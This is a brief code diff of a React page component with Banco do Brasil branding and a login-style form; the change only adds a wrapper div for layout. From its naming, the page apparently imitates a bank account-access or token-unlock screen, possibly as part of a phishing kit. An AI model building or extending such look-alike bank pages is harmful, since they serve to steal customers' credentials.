@@ -905,6 +905,7 @@ function PjPhoneUnlockPage() {
       </button>
 
       <section className="token-left">
+        <div className="token-left-inner">
         <header className="token-header">
           <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="token-logo" />
           <h1 className="token-title">Acesse sua conta Banco do Brasil</h1>
@@ -971,6 +972,7 @@ function PjPhoneUnlockPage() {
             AVANÇAR
           </button>
         </form>
+        </div>
       </section>
 
       <aside className="token-right" aria-hidden="true">
